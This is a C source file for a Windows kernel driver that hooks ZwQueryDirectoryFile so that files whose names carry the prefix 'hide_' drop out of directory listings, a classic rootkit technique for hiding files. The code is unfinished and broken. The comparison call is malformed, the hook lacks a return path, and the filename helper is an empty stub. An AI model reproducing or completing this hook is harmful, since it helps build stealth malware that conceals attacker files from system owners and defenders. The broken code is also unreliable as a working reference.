#include <windowsx.h>
#include <wdm.h>

typedef int BOOL;

char* getDirEntryFileName(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass);
BOOL tobeHidden(char* fileName);

typedef NTSTATUS(*ZwQueryDirectoryFilePtr)(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_writes_bytes_(Length) PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING FileName,
	_In_ BOOLEAN RestartScan
	);

ZwQueryDirectoryFilePtr oldZwQueryDirectoryFile;

NTSTATUS Hook_ZwQueryDirectoryFile(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_writes_bytes_(Length) PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING FileName,
	_In_ BOOLEAN RestartScan
) {

	PVOID currentFile, previousFile;
	NTSTATUS ntStatus = oldZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}

	if (FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation
		) {

		currentFile = FileInformation;
		previousFile = NULL;

		RtlCompareMemory("hide_", )
	}

}

char* getDirEntryFileName(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass) {

}